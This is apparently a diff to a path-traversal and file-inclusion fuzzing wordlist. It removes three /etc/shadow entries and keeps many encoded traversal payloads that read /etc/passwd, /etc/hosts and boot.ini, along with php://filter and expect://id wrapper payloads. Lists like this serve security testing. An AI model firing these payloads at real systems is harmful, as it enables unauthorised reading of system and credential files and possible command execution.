@@ -28,9 +28,7 @@
 /../../../../../../../../../../../etc/passwd%00.jpg
 /../../../../../../../../../../../etc/passwd%00.html
 /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
-/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
 ../../../../../../../../../../../../etc/hosts%00
 ../../../../../../../../../../../../etc/hosts
 ../../boot.ini
@@ -53,7 +51,6 @@ expect://id
 php://filter/read=convert.base64-encode/resource=index.php
 \..\..\..\..\..\..\..\..\..\..\etc\passwd
 ..././..././..././..././etc/paswd
-\..\..\..\..\..\..\..\..\..\..\etc\shadow
 ..\..\..\..\..\..\..\..\..\..\etc\passwd
 /..\../..\../..\../..\../..\../..\../etc/passwd
 .\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
